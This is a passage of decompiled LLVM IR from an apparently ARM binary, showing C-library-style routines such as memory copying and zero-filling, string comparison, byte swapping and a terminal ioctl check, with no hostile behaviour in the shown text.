  %v3_f934 = load i8, i8* %v2_f934, align 1
  %v4_f934 = zext i8 %v3_f934 to i32
  store i32 %v4_f934, i32* %r3.global-to-local, align 4
  %v2_f938 = icmp eq i8 %v3_f934, 0
  store i1 %v2_f938, i1* %cpsr_z.global-to-local, align 1
  %v3_f93c = add i32 %v5_f92c, 2
  %v4_f93c = inttoptr i32 %v3_f93c to i8*
  store i8 %v3_f934, i8* %v4_f93c, align 1
  %v5_f93c = load i32, i32* @ip, align 4
  %v6_f93c = add i32 %v5_f93c, 1
  store i32 %v6_f93c, i32* @ip, align 4
  %v0_f940 = load i32, i32* @r1, align 4
  %v1_f940 = add i32 %v0_f940, 1
  store i32 %v1_f940, i32* %r1.global-to-local, align 4
  %v0_f944 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f944, label %dec_label_pc_f980, label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %dec_label_pc_f934
  %v1_f948 = add i32 %v0_f940, 2
  %v2_f948 = inttoptr i32 %v1_f948 to i8*
  %v3_f948 = load i8, i8* %v2_f948, align 1
  %v4_f948 = zext i8 %v3_f948 to i32
  store i32 %v4_f948, i32* %r3.global-to-local, align 4
  %v2_f94c = icmp eq i8 %v3_f948, 0
  store i1 %v2_f94c, i1* %cpsr_z.global-to-local, align 1
  %v3_f950 = add i32 %v5_f93c, 2
  %v4_f950 = inttoptr i32 %v3_f950 to i8*
  store i8 %v3_f948, i8* %v4_f950, align 1
  %v5_f950 = load i32, i32* @ip, align 4
  %v6_f950 = add i32 %v5_f950, 1
  store i32 %v6_f950, i32* @ip, align 4
  %v0_f954 = load i32, i32* %r1.global-to-local, align 4
  %v1_f954 = add i32 %v0_f954, 1
  store i32 %v1_f954, i32* %r1.global-to-local, align 4
  %v0_f958 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f958, label %dec_label_pc_f980, label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f948
  %v1_f95c = add i32 %v0_f954, 2
  %v2_f95c = inttoptr i32 %v1_f95c to i8*
  %v3_f95c = load i8, i8* %v2_f95c, align 1
  %v4_f95c = zext i8 %v3_f95c to i32
  store i32 %v4_f95c, i32* %r3.global-to-local, align 4
  %v2_f960 = icmp eq i8 %v3_f95c, 0
  store i1 %v2_f960, i1* %cpsr_z.global-to-local, align 1
  %v3_f964 = add i32 %v5_f950, 2
  %v4_f964 = inttoptr i32 %v3_f964 to i8*
  store i8 %v3_f95c, i8* %v4_f964, align 1
  %v5_f964 = load i32, i32* @ip, align 4
  %v6_f964 = add i32 %v5_f964, 1
  store i32 %v6_f964, i32* @ip, align 4
  %v0_f968 = load i32, i32* %r1.global-to-local, align 4
  %v1_f968 = add i32 %v0_f968, 1
  store i32 %v1_f968, i32* %r1.global-to-local, align 4
  %v0_f96c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f96c, label %dec_label_pc_f980, label %dec_label_pc_f970

dec_label_pc_f970:                                ; preds = %dec_label_pc_f95c
  %v0_f970 = load i32, i32* %lr.global-to-local, align 4
  %v1_f970 = add i32 %v0_f970, -1
  store i32 %v1_f970, i32* %lr.global-to-local, align 4
  %v7_f970 = icmp eq i32 %v0_f970, 1
  store i1 %v7_f970, i1* %cpsr_z.global-to-local, align 1
  %v1_f974 = add i32 %v0_f968, 2
  store i32 %v1_f974, i32* @r1, align 4
  br i1 %v7_f970, label %dec_label_pc_f994, label %dec_label_pc_f924

dec_label_pc_f980:                                ; preds = %dec_label_pc_f95c, %dec_label_pc_f948, %dec_label_pc_f934, %dec_label_pc_f924
  %v1_f980 = phi i32 [ %v6_f964, %dec_label_pc_f95c ], [ %v6_f950, %dec_label_pc_f948 ], [ %v6_f93c, %dec_label_pc_f934 ], [ %v6_f92c, %dec_label_pc_f924 ]
  %v2_f9801 = sub i32 %arg1, %v1_f980
  %v2_f984 = add i32 %v2_f9801, %arg2
  %v1_f988 = add i32 %v2_f984, -1
  store i32 %v1_f988, i32* %r3.global-to-local, align 4
  %v7_f988 = icmp eq i32 %v2_f984, 1
  store i1 %v7_f988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f988, label %dec_label_pc_f9c4, label %dec_label_pc_f9b4

dec_label_pc_f994:                                ; preds = %dec_label_pc_f970, %dec_label_pc_f910
  %v2_f9a47 = phi i32 [ %v1_f918, %dec_label_pc_f910 ], [ %v6_f964, %dec_label_pc_f970 ]
  %v1_f994 = urem i32 %arg2, 4
  store i32 %v1_f994, i32* %r3.global-to-local, align 4
  %v2_f994 = icmp eq i32 %v1_f994, 0
  store i1 %v2_f994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f994, label %dec_label_pc_f9c4, label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f994, %dec_label_pc_f9ac.dec_label_pc_f99c_crit_edge
  %v2_f9a4 = phi i32 [ %v6_f9a4, %dec_label_pc_f9ac.dec_label_pc_f99c_crit_edge ], [ %v2_f9a47, %dec_label_pc_f994 ]
  %v0_f9a0 = phi i32 [ %v0_f9a0.pre, %dec_label_pc_f9ac.dec_label_pc_f99c_crit_edge ], [ %v1_f994, %dec_label_pc_f994 ]
  %v0_f99c = load i32, i32* @r1, align 4
  %v1_f99c = inttoptr i32 %v0_f99c to i8*
  %v2_f99c = load i8, i8* %v1_f99c, align 1
  %v3_f99c = zext i8 %v2_f99c to i32
  store i32 %v3_f99c, i32* %r2.global-to-local, align 4
  %v5_f99c = add i32 %v0_f99c, 1
  store i32 %v5_f99c, i32* @r1, align 4
  %v1_f9a0 = add i32 %v0_f9a0, -1
  store i32 %v1_f9a0, i32* %r3.global-to-local, align 4
  %v7_f9a0 = icmp eq i32 %v0_f9a0, 1
  store i1 %v7_f9a0, i1* %cpsr_z.global-to-local, align 1
  %v3_f9a4 = add i32 %v2_f9a4, 1
  %v4_f9a4 = inttoptr i32 %v3_f9a4 to i8*
  store i8 %v2_f99c, i8* %v4_f9a4, align 1
  %v5_f9a4 = load i32, i32* @ip, align 4
  %v6_f9a4 = add i32 %v5_f9a4, 1
  store i32 %v6_f9a4, i32* @ip, align 4
  %v0_f9a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f9a8, label %dec_label_pc_f9c4, label %dec_label_pc_f9ac

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f99c
  %v0_f9ac = load i32, i32* %r2.global-to-local, align 4
  %v2_f9ac = icmp eq i32 %v0_f9ac, 0
  store i1 %v2_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9ac, label %dec_label_pc_f9b4, label %dec_label_pc_f9ac.dec_label_pc_f99c_crit_edge

dec_label_pc_f9ac.dec_label_pc_f99c_crit_edge:    ; preds = %dec_label_pc_f9ac
  %v0_f9a0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f99c

dec_label_pc_f9b4:                                ; preds = %dec_label_pc_f9ac, %dec_label_pc_f980
  %v2_f9bc10 = phi i32 [ %v1_f980, %dec_label_pc_f980 ], [ %v6_f9a4, %dec_label_pc_f9ac ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b8.dec_label_pc_f9b8_crit_edge, %dec_label_pc_f9b4
  %v2_f9bc = phi i32 [ %v6_f9bc, %dec_label_pc_f9b8.dec_label_pc_f9b8_crit_edge ], [ %v2_f9bc10, %dec_label_pc_f9b4 ]
  %v0_f9bc.off0 = phi i8 [ %extract.t, %dec_label_pc_f9b8.dec_label_pc_f9b8_crit_edge ], [ 0, %dec_label_pc_f9b4 ]
  %v0_f9b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f9b8 = add i32 %v0_f9b8, -1
  store i32 %v1_f9b8, i32* %r3.global-to-local, align 4
  %v7_f9b8 = icmp eq i32 %v0_f9b8, 1
  store i1 %v7_f9b8, i1* %cpsr_z.global-to-local, align 1
  %v3_f9bc = add i32 %v2_f9bc, 1
  %v4_f9bc = inttoptr i32 %v3_f9bc to i8*
  store i8 %v0_f9bc.off0, i8* %v4_f9bc, align 1
  %v5_f9bc = load i32, i32* @ip, align 4
  %v6_f9bc = add i32 %v5_f9bc, 1
  store i32 %v6_f9bc, i32* @ip, align 4
  %v0_f9c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f9c0, label %dec_label_pc_f9c4, label %dec_label_pc_f9b8.dec_label_pc_f9b8_crit_edge

dec_label_pc_f9b8.dec_label_pc_f9b8_crit_edge:    ; preds = %dec_label_pc_f9b8
  %v0_f9bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_f9bc.pre to i8
  br label %dec_label_pc_f9b8

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f99c, %dec_label_pc_f9b8, %dec_label_pc_f980, %dec_label_pc_f994
  %v2_f9c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_f9c4, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_f9bc, { 1, 0 }
  uselistorder i32 %v0_f9b8, { 1, 0 }
  uselistorder i32 %v6_f9a4, { 0, 2, 1 }
  uselistorder i32 %v1_f994, { 2, 1, 0 }
  uselistorder i32 %v2_f984, { 1, 0 }
  uselistorder i32 %v1_f974, { 1, 0 }
  uselistorder i32 %v0_f970, { 1, 0 }
  uselistorder i32 %v6_f964, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9c4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f99c, { 1, 0 }
}

define i32 @function_f9cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f9cc:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f9d4 = call i32 @function_fa80()
  %v0_f9d8 = load i32, i32* @r4, align 4
  ret i32 %v0_f9d8
}

define i32 @function_f9e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f9e4:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 153216, i32* @r2, align 4
  %v0_f9fc = call i32 @function_14c80()
  ret i32 %v0_f9fc
}

define i32 @function_fa14(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fa14:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_fa5c, %dec_label_pc_fa14
  %v1_fa748 = phi i32 [ %v1_fa749, %dec_label_pc_fa5c ], [ 0, %dec_label_pc_fa14 ]
  %v0_fa64 = phi i32 [ %v1_fa64, %dec_label_pc_fa5c ], [ %arg2, %dec_label_pc_fa14 ]
  %v0_fa68 = phi i32 [ %v1_fa68, %dec_label_pc_fa5c ], [ %tmp, %dec_label_pc_fa14 ]
  %v9_fa30 = icmp eq i32 %v0_fa68, %v0_fa64
  %.pre = inttoptr i32 %v0_fa68 to i8*
  br i1 %v9_fa30, label %dec_label_pc_fa5c, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa30
  %v2_fa38 = load i8, i8* %.pre, align 1
  %v3_fa38 = zext i8 %v2_fa38 to i32
  %v1_fa3c = inttoptr i32 %v0_fa64 to i8*
  %v2_fa3c = load i8, i8* %v1_fa3c, align 1
  %v3_fa3c = zext i8 %v2_fa3c to i32
  %v4_fa40 = load i32, i32* inttoptr (i32 143892 to i32*), align 4
  %v2_fa44 = mul nuw nsw i32 %v3_fa3c, 2
  %v2_fa48 = mul nuw nsw i32 %v3_fa38, 2
  %v2_fa4c = add i32 %v4_fa40, %v2_fa44
  %v3_fa4c = inttoptr i32 %v2_fa4c to i16*
  %v4_fa4c = load i16, i16* %v3_fa4c, align 2
  %v6_fa4c = sext i16 %v4_fa4c to i32
  %v2_fa50 = add i32 %v4_fa40, %v2_fa48
  %v3_fa50 = inttoptr i32 %v2_fa50 to i16*
  %v4_fa50 = load i16, i16* %v3_fa50, align 2
  %v6_fa50 = sext i16 %v4_fa50 to i32
  %v2_fa54 = sub nsw i32 %v6_fa50, %v6_fa4c
  %v9_fa54 = icmp eq i16 %v4_fa50, %v4_fa4c
  br i1 %v9_fa54, label %dec_label_pc_fa5c, label %dec_label_pc_fa70

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa30, %dec_label_pc_fa38
  %v1_fa749 = phi i32 [ %v2_fa54, %dec_label_pc_fa38 ], [ %v1_fa748, %dec_label_pc_fa30 ]
  %v2_fa5c = load i8, i8* %.pre, align 1
  %v2_fa60 = icmp eq i8 %v2_fa5c, 0
  %v1_fa64 = add i32 %v0_fa64, 1
  %v1_fa68 = add i32 %v0_fa68, 1
  store i32 %v1_fa68, i32* @ip, align 4
  br i1 %v2_fa60, label %dec_label_pc_fa70, label %dec_label_pc_fa30

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa5c, %dec_label_pc_fa38
  %v1_fa74 = phi i32 [ %v1_fa749, %dec_label_pc_fa5c ], [ %v2_fa54, %dec_label_pc_fa38 ]
  ret i32 %v1_fa74

; uselistorder directives
  uselistorder i32 %v1_fa68, { 1, 0 }
  uselistorder i32 %v2_fa54, { 1, 0 }
  uselistorder i32 %v0_fa68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa5c, { 1, 0 }
}

define i32 @function_fa80() local_unnamed_addr {
dec_label_pc_fa80:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_fa80 = load i32, i32* @r4, align 4
  %v9_fa80 = load i32, i32* @r6, align 4
  %v0_fa88 = load i32, i32* @r0, align 4
  store i32 142964, i32* @r6, align 4
  store i32 %v0_fa88, i32* @ip, align 4
  %v0_fa98 = load i32, i32* @r1, align 4
  store i32 %v0_fa98, i32* @r7, align 4
  %v0_fa9c = load i32, i32* @r2, align 4
  store i32 %v0_fa9c, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_fa88, 124
  br i1 %tmp, label %dec_label_pc_fad4, label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %dec_label_pc_fa80
  br label %dec_label_pc_fabc

dec_label_pc_fab0:                                ; preds = %dec_label_pc_fabc
  br i1 %v2_fac8, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_fab0
  %v2_fab4 = add i32 %v1_facc, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_fab0, %bb
  %v0_fabc1 = phi i32 [ %v1_facc, %dec_label_pc_fab0 ], [ %v2_fab4, %bb ]
  %v1_fab8 = add i32 %v0_fab8, 1
  br label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa4, %bb15
  %v1_facc = phi i32 [ %v0_fa88, %dec_label_pc_faa4 ], [ %v0_fabc1, %bb15 ]
  %v0_fab8 = phi i32 [ ptrtoint ([8 x i8]* @global_var_19b68.403 to i32), %dec_label_pc_faa4 ], [ %v1_fab8, %bb15 ]
  store i32 %v0_fab8, i32* @r5, align 4
  %v2_fabc = icmp eq i32 %v1_facc, 0
  %v1_fac0 = inttoptr i32 %v0_fab8 to i8*
  %v2_fac0 = load i8, i8* %v1_fac0, align 1
  %v2_fac8 = icmp eq i8 %v2_fac0, 0
  br i1 %v2_fabc, label %dec_label_pc_fac8, label %dec_label_pc_fab0

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fabc
  br i1 %v2_fac8, label %dec_label_pc_fad4, label %bb16

bb16:                                             ; preds = %dec_label_pc_fac8
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fb10

dec_label_pc_fad4:                                ; preds = %dec_label_pc_fac8, %dec_label_pc_fa80
  store i32 %v0_fa88, i32* @r2, align 4
  %v3_fadc = ashr i32 %v0_fa88, 31
  store i32 %v3_fadc, i32* @r3, align 4
  %v6_faf0 = bitcast i32* %stack_var_-25 to i8*
  %v7_faf0 = call i32 @function_13ba0(i8* %v6_faf0)
  %v1_faf8 = add i32 %v7_faf0, -14
  store i32 %v1_faf8, i32* @r5, align 4
  %v0_fafc = load i32, i32* @r6, align 4
  %v2_fafc = add i32 %v0_fafc, -37660
  store i32 %v2_fafc, i32* @r1, align 4
  store i32 %v1_faf8, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_fb08 = call i32 @function_f700()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_fb10.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %bb16, %dec_label_pc_fad4
  %v0_fb10 = phi i32 [ %v0_fab8, %bb16 ], [ %v0_fb10.pre, %dec_label_pc_fad4 ]
  store i32 %v0_fb10, i32* @r0, align 4
  %v0_fb14 = call i32 @function_f670()
  %v0_fb18 = load i32, i32* @r7, align 4
  %v2_fb18 = icmp eq i32 %v0_fb18, 0
  br i1 %v2_fb18, label %bb17, label %dec_label_pc_fb10._crit_edge

dec_label_pc_fb10._crit_edge:                     ; preds = %dec_label_pc_fb10
  %v1_fb24.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_fb10
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_fb10._crit_edge, %bb17
  %v1_fb24 = phi i32 [ %v1_fb24.pre, %dec_label_pc_fb10._crit_edge ], [ 0, %bb17 ]
  %v1_fb20 = add i32 %v0_fb14, 1
  %v3_fb24 = icmp uge i32 %v1_fb20, %v1_fb24
  %v9_fb24 = icmp eq i32 %v1_fb20, %v1_fb24
  %v2_fb28 = xor i1 %v3_fb24, true
  %v3_fb28 = or i1 %v9_fb24, %v2_fb28
  br i1 %v3_fb28, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_fb20, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_fb38 = phi i32 [ %v1_fb24, %bb18 ], [ %v1_fb20, %bb19 ]
  %v2_fb2c = xor i1 %v9_fb24, true
  %v3_fb2c = and i1 %v3_fb24, %v2_fb2c
  br i1 %v3_fb2c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_fb30 = icmp eq i32 %v0_fb38, 0
  br i1 %v2_fb30, label %dec_label_pc_fb54, label %dec_label_pc_fb38

dec_label_pc_fb38:                                ; preds = %bb22
  store i32 %v0_fb38, i32* @r2, align 4
  %v0_fb3c = load i32, i32* @r5, align 4
  store i32 %v0_fb3c, i32* @r1, align 4
  store i32 %v0_fb18, i32* @r0, align 4
  %v0_fb44 = call i32 @function_f700()
  %v0_fb48 = load i32, i32* @r4, align 4
  %v1_fb48 = load i32, i32* @r7, align 4
  %v2_fb48 = add i32 %v1_fb48, %v0_fb48
  %v3_fb50 = add i32 %v2_fb48, -1
  %v4_fb50 = inttoptr i32 %v3_fb50 to i8*
  store i8 0, i8* %v4_fb50, align 1
  br label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %bb22, %dec_label_pc_fb38
  %v0_fb54 = load i32, i32* %r6.global-to-local, align 4
  %v2_fb54 = icmp eq i32 %v0_fb54, 0
  br i1 %v2_fb54, label %dec_label_pc_fb64, label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_fb54
  %v0_fb5c = call i32 @function_d0ec()
  %v0_fb60 = load i32, i32* %r6.global-to-local, align 4
  %v2_fb60 = inttoptr i32 %v0_fb5c to i32*
  store i32 %v0_fb60, i32* %v2_fb60, align 4
  %v0_fb64.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb54, %dec_label_pc_fb5c
  %v0_fb64 = phi i32 [ 0, %dec_label_pc_fb54 ], [ %v0_fb64.pre, %dec_label_pc_fb5c ]
  store i32 %v3_fa80, i32* @r4, align 4
  store i32 %v9_fa80, i32* %r6.global-to-local, align 4
  ret i32 %v0_fb64

; uselistorder directives
  uselistorder i1 %v3_fb24, { 1, 0 }
  uselistorder i32 %v0_fab8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_facc, { 1, 0, 2 }
  uselistorder i32 %v0_fa88, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_fb64, { 1, 0 }
  uselistorder label %dec_label_pc_fb54, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_fb10, { 1, 0 }
  uselistorder label %dec_label_pc_fabc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_fb80(i32 %arg1) local_unnamed_addr {
dec_label_pc_fb80:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fb80 = load i32, i32* @r4, align 4
  store i32 %v3_fb80, i32* %stack_var_-16, align 4
  %v9_fb80 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r6, align 4
  %v0_fb88 = call i32 @function_f670()
  %v1_fb8c = add i32 %v0_fb88, 1
  store i32 %v1_fb8c, i32* @r4, align 4
  %v1_fb94 = call i32 @function_10110(i32 %v1_fb8c)
  store i32 %v1_fb94, i32* %r5.global-to-local, align 4
  %v2_fb98 = icmp eq i32 %v1_fb94, 0
  br i1 %v2_fb98, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fb80
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fb80, %bb
  %v1_fba4 = xor i1 %v2_fb98, true
  call void @__pseudo_cond_branch(i1 %v1_fba4, i32 ptrtoint (i32* @global_var_f700.405 to i32))
  %v0_fba8 = load i32, i32* %r5.global-to-local, align 4
  %v2_fbac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fbac, i32* @r4, align 4
  store i32 %v9_fb80, i32* @r6, align 4
  ret i32 %v0_fba8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_fbb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fbb4:
  %stack_var_-68 = alloca i32, align 4
  %v2_fbbc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_fbbc, i32* @r1, align 4
  %v0_fbc0 = call i32 @function_fbd8()
  %v1_fbc4 = sub i32 1, %v0_fbc0
  %v2_fbc4 = icmp ult i32 %v0_fbc0, 2
  br i1 %v2_fbc4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_fbb4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_fbb4, %bb
  %v1_fbd4 = phi i32 [ %v1_fbc4, %dec_label_pc_fbb4 ], [ 0, %bb ]
  ret i32 %v1_fbd4

; uselistorder directives
  uselistorder i32 %v0_fbc0, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_fbd8() local_unnamed_addr {
dec_label_pc_fbd8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_fbd8 = load i32, i32* @r4, align 4
  %v6_fbd8 = load i32, i32* @r5, align 4
  %v2_fbe0 = ptrtoint i32* %stack_var_-52 to i32
  %v0_fbe4 = load i32, i32* @r1, align 4
  store i32 %v0_fbe4, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_fbf0 = load i32, i32* @r0, align 4
  %v3_fbf0 = call i32 @function_d034(i32 %v0_fbf0, i32 21505, i32 %v2_fbe0)
  store i32 %v3_fbf0, i32* %r0.global-to-local, align 4
  store i32 %v3_fbf0, i32* @r5, align 4
  %v2_fbf4 = icmp eq i32 %v3_fbf0, 0
  br i1 %v2_fbf4, label %dec_label_pc_fbfc, label %dec_label_pc_fc40

dec_label_pc_fbfc:                                ; preds = %dec_label_pc_fbd8
  %v4_fc08 = zext i8 %tmp to i32
  store i32 %v4_fc08, i32* @ip, align 4
  %v3_fc0c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_fc0c, i32* @r3, align 4
  %v1_fc10 = load i32, i32* @r4, align 4
  %v2_fc10 = add i32 %v1_fc10, 4
  %v3_fc10 = inttoptr i32 %v2_fc10 to i32*
  %v0_fc14 = load i32, i32* %r1.global-to-local, align 4
  %v1_fc14 = load i32, i32* @r4, align 4
  %v2_fc14 = add i32 %v1_fc14, 8
  %v3_fc14 = inttoptr i32 %v2_fc14 to i32*
  store i32 %v0_fc14, i32* %v3_fc14, align 4
  %v0_fc18 = load i32, i32* %r0.global-to-local, align 4
  %v1_fc18 = load i32, i32* @r4, align 4
  %v2_fc18 = add i32 %v1_fc18, 12
  %v3_fc18 = inttoptr i32 %v2_fc18 to i32*
  store i32 %v0_fc18, i32* %v3_fc18, align 4
  %v2_fc1c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_fc1c, i32* @r1, align 4
  %v1_fc24 = load i32, i32* @r4, align 4
  %v2_fc24 = inttoptr i32 %v1_fc24 to i32*
  store i32 %v3_fc0c, i32* %v2_fc24, align 4
  %v0_fc28 = load i32, i32* @ip, align 4
  %v1_fc28 = trunc i32 %v0_fc28 to i8
  %v2_fc28 = load i32, i32* @r4, align 4
  %v3_fc28 = add i32 %v2_fc28, 16
  %v4_fc28 = inttoptr i32 %v3_fc28 to i8*
  store i8 %v1_fc28, i8* %v4_fc28, align 1
  %v0_fc2c = load i32, i32* @r4, align 4
  %v1_fc2c = add i32 %v0_fc2c, 17
  store i32 %v1_fc2c, i32* %r0.global-to-local, align 4
  %v4_fc30 = call i32 @function_14f68(i32 %v1_fc2c, i32 %v2_fc1c, i32 19, i32 %v3_fc0c)
  store i32 %v4_fc30, i32* %r0.global-to-local, align 4
  %v0_fc34 = load i32, i32* @r5, align 4
  store i32 %v0_fc34, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_fc3c = inttoptr i32 %v4_fc30 to i8*
  %v3_fc3c = call i32 @function_f5d0(i8* %v2_fc3c, i32 %v0_fc34)
  store i32 %v3_fc3c, i32* %r0.global-to-local, align 4
  %v0_fc40.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fbd8, %dec_label_pc_fbfc
  %v0_fc40 = phi i32 [ %v3_fbf0, %dec_label_pc_fbd8 ], [ %v0_fc40.pre, %dec_label_pc_fbfc ]
  store i32 %v0_fc40, i32* %r0.global-to-local, align 4
  store i32 %v3_fbd8, i32* @r4, align 4
  store i32 %v6_fbd8, i32* @r5, align 4
  ret i32 %v0_fc40

; uselistorder directives
  uselistorder i32 %v0_fc40, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32)* @function_d034, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fc40, { 1, 0 }
}

define i32 @function_fc54(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc54:
  %v3_fc54 = udiv i32 %arg1, 256
  %v1_fc58 = mul i32 %arg1, 256
  %v4_fc5c = and i32 %v1_fc58, 65280
  %v5_fc5c = or i32 %v4_fc5c, %v3_fc54
  ret i32 %v5_fc5c
}

define i32 @function_fc64(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc64:
  %v5_fc7c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_fc7c
}

define i32 @function_fc84(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc84:
  %v3_fc84 = udiv i32 %arg1, 256
  %v1_fc88 = mul i32 %arg1, 256
  %v4_fc8c = and i32 %v1_fc88, 65280
  %v5_fc8c = or i32 %v4_fc8c, %v3_fc84
  ret i32 %v5_fc8c
}

define i32 @function_fc94(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc94:
  %v5_fcac = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_fcac
}

define i32 @function_fcb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fcb4:
  %v0_fce0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fdd4, %dec_label_pc_fcb4
  %v1_fdb8 = phi i32 [ %v2_fdc0, %dec_label_pc_fdd4 ], [ 0, %dec_label_pc_fcb4 ]
  %v0_fdc8 = phi i32 [ %v1_fdc8, %dec_label_pc_fdd4 ], [ 0, %dec_label_pc_fcb4 ]
  %v0_fcf4 = phi i32 [ %v1_fdd4, %dec_label_pc_fdd4 ], [ %v0_fce0.pre, %dec_label_pc_fcb4 ]
  %v1_fce0 = inttoptr i32 %v0_fcf4 to i8*
  %v2_fce0 = load i8, i8* %v1_fce0, align 1
  %v7_fce4 = icmp eq i8 %v2_fce0, 48
  br i1 %v7_fce4, label %dec_label_pc_fcf4, label %.thread

.thread:                                          ; preds = %dec_label_pc_fce0
  br label %.thread9

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fce0
  %v1_fcf4 = add i32 %v0_fcf4, 1
